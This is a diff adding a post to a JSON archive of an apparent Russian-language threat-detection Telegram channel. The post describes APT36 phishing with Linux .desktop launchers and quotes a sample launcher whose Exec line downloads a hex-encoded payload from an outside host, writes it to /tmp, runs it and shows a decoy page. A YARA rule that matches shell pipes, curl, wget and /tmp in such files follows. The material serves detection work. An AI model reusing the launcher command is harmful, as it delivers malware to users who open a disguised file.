@@ -1,8 +1,15 @@
 {
   "channel": "detectioneasy",
-  "last_update": "2026-03-15T14:37:41.042056+00:00",
-  "messages_count": 63,
+  "last_update": "2026-03-15T18:50:59.078391+00:00",
+  "messages_count": 64,
   "messages": [
+    {
+      "id": "326",
+      "title": "Тема с ярлыками остаётся актуальной и для некоторых дистрибутивов Linux. Эту технику использует группировка APT36",
+      "text": "Всем привет 💻✌️\nТема с ярлыками остаётся актуальной и для некоторых дистрибутивов Linux. Эту технику использует группировка APT36\n.desktop — это launcher-файл, описанный в Desktop Entry Specification. Он используется desktop-environments для отображения приложений в меню и содержит параметр Exec, определяющий команду запуска.\nПример файла:\n[Desktop Entry]\nName=Meeting_Ltr_ID15430ps.pdf\nExec=bash -c 'tmp_file=\"/tmp/Meeting_Ltr_ID15430ps.pdf-$(date +%s)\"; curl -s \"https://securestore.cv/ghg/Mt_dated_29.txt\" | xxd -r -p > \"$tmp_file\" && chmod +x \"$tmp_file\" && \"$tmp_file\" & firefox --new-window \"https://drive.google.com/file/d/123\"'\nTerminal=false\nType=Application\nIcon=application-pdf\nCategories=Utility;\nX-GNOME-Autostart-enabled=true\nX-AppImage-Integrate=false\nЗлоумышленники используют файлы .desktop для получения доступа к хосту в фишинговых кампаниях. Далее цепочка действий несильно отличается от атак на Windows: загрузка вредоносного файла, его запуск и отображение пользователю decoy-файла\n🔭 Обнаружение:\n🔤 отслеживаем создание или модификацию .desktop файлов в пользовательских каталогах\n🔤 хантим использование бинарей из gtfobins (bash, sh, python, curl, wget) в Exec\nrule Linux_Desktop_Suspicious_GTFOBins\n{\nmeta:\ndescription = \"Detect suspicious .desktop launcher executing shells or GTFOBins\"\nauthor = \"@detectioneasy\"\ndate = \"2026-03-15\"\nreference = \"https://www.cyfirma.com/research/apt36-targets-indian-boss-linux-systems-with-weaponized-autostart-files/\"\nstrings:\n$desktop = \"[Desktop Entry]\" ascii nocase\n$exec = \"Exec=\" ascii nocase\n$sh = \"sh -c\" ascii nocase\n$pipe_sh = \"| sh\" ascii nocase\n$pipe_bash = \"| bash\" ascii nocase\n$pipe_zsh = \"| zsh\" ascii nocase\n$pipe_dash = \"| dash\" ascii nocase\n$curl = \"curl \" ascii nocase\n$wget = \"wget \" ascii nocase\n$tmp = \"/tmp/\" ascii nocase\n$cache = \".cache/\" ascii nocase\ncondition:\n$desktop and $exec and\n2 of (\n$sh,\n$pipe_sh,$pipe_bash,$pipe_zsh,$pipe_dash,\n$curl,$wget,$tmp,$cache\n)\n}\n#detection@detectioneasy\n#ttp@detectioneasy",
+      "link": "https://t.me/detectioneasy/326",
+      "pub_date": "2026-03-15T15:22:20+00:00"
+    },
     {
       "id": "325",
       "title": "Группа APT-36 собирает необычные .lnk файлы размером более 2 MB, которые содержат PDF-структуры",
